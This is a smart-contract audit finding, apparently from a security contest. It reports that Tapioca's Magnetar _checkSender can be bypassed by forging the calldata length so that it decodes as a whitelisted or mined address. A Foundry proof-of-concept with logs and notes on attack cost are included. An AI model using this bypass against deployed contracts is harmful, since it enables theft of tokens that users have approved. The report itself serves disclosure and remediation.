@@ -1,0 +1,27 @@
+[H-08]IMarket.execute.selector,_checkSenderbypass allows to execute arbitrary operations
+Submitted byGalloDaSballo
+Because of an incorrect interpretation ofcalldatafor theexecutesignature, we are able to bypass the_checkSenderand perform arbitraryexecuteoperations as Magnetar.
+Impact
+Market.executeuses the following signature:
+functionexecute(Module[]calldatamodules,bytes[]calldatacalls,boolrevertOnFail)
+For Calldata variables, the size4:36is going to be thelengthof thecalldata. We can specify an arbitrary length that matches the value of any address that is whitelisted, or any address that we’re able to generate. This will allow us to bypass the check and perform arbitrary execution in the market.
+After forging our length, we have bypassed the check, allowing us to execute, while having permissions/allowances from other users:
+https://github.com/Tapioca-DAO/tapioca-periph/blob/2ddbcb1cde03b548e13421b2dba66435d2ac8eb5/contracts/Magnetar/Magnetar.sol#L256-L281
+function_processMarketOperation(address_target,bytescalldata_actionCalldata,uint256_actionValue,bool_allowFailure)private{if(!cluster.isWhitelisted(0,_target))revertMagnetar_NotAuthorized(_target,_target);/// @dev owner address should always be first param.// addCollateral(address from,...)// borrow(address from,...)// addAsset(address from,...)// repay(address _from,...)// buyCollateral(address from,...)// sellCollateral(address from,...)bytes4funcSig=bytes4(_actionCalldata[:4]);if(funcSig==IMarket.execute.selector||funcSig==ISingularity.addAsset.selector/// @audit ??????||funcSig==ISingularity.removeAsset.selector) {/// @dev Owner param check. See Warning above._checkSender(abi.decode(_actionCalldata[4:36], (address)));/// @audit we can forge this 80%_executeCall(_target,_actionCalldata,_actionValue,_allowFailure);return;}
+POC
+This will allow us to transfer any token that is approved to us, stealing them. We can proceed to mine an address with low enough zeros, or simply use a suitable system address for any chain, as the requirement for_checkSender(abi.decode(_actionCalldata[4:36], (address)))is simply to match themsg.sender.
+An example would be the Optimism Portal on L2 which would have very low address; meaning we would be able to have a sufficient amount of operations there. Once we can bypass the check, we will be able to have Magnetarexecuteany market operation, such as transfers of other people tokens, allowing us to steal them.
+Coded POC
+The Coded POC shows how we can forge calldata to bypass the check, as long as we can use an address that matches the abi.decoding of the length:
+// SPDX-License-Identifier: MITpragmasolidity0.8.22;import{Test}from"forge-std/Test.sol";import{console2}from"forge-std/console2.sol";contractMockCallerChecker{functiondoTheCheck(bytescalldata_actionCalldata)external{console2.log("Calldata Length",_actionCalldata.length);_checkSender(abi.decode(_actionCalldata[4:36], (address)));}function_checkSender(addressentry)internal{console2.log("msg.sender",msg.sender);console2.log("entry",entry);require(msg.sender==entry);}}contractBasicTestisTest{// 4 bytes is funsig 0xaaaaaaaa// 32 bytes are the address (since abi.encoding uses a full word)// 0000000000000000000000000000000000000000111111111111111111111111bytesdata=hex"aaaaaaaa0000000000000000000000000000000000000000111111111111111111111111";functiontestDemo()public{MockCallerCheckerchecker=newMockCallerChecker();console2.log(data.length);// Same address as the lengthvm.prank(address(0x111111111111111111111111));checker.doTheCheck(data);// For a real exploit, all we have to do is find the cheapest between available addresses and one we can mine}}
+Logs
+Logs:36CalldataLength36msg.sender0x0000000000000000111111111111111111111111entry0x0000000000000000111111111111111111111111Traces:[217996] BasicTest::testDemo()├─ [169614] →newMockCallerChecker@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f│   └─ ←847bytesofcode├─ [0] console::log(36) [staticcall]│   └─ ← ()├─ [0] VM::prank(0x0000000000000000111111111111111111111111)│   └─ ← ()├─ [2931] MockCallerChecker::doTheCheck(0xaaaaaaaa0000000000000000000000000000000000000000111111111111111111111111)│   ├─ [0] console::log("Calldata Length",36) [staticcall]│   │   └─ ← ()│   ├─ [0] console::log("msg.sender",0x0000000000000000111111111111111111111111) [staticcall]│   │   └─ ← ()│   ├─ [0] console::log("entry",0x0000000000000000111111111111111111111111) [staticcall]│   │   └─ ← ()│   └─ ← ()└─ ← ()
+Notes on Cost
+The cost of the attack is the cost of finding an address that is small enough to steal all funds; As far as I can tell, this would take a few days on specialized hardware.
+On certain chains, with system contracts (e.g. Optimism) the cost would be zero as we could act on behalf of the Portal and we would be able to use very small amount of data.
+It’s also worth noting that Arbitrum (the base chain of the project), has no gas limit on blocks.
+Mitigation
+It may be necessary to removeexecutefrom available commands as all commands will be performed byMagnetar.
+Assessed type
+en/de-code
+0xWeiss (Tapioca) confirmed
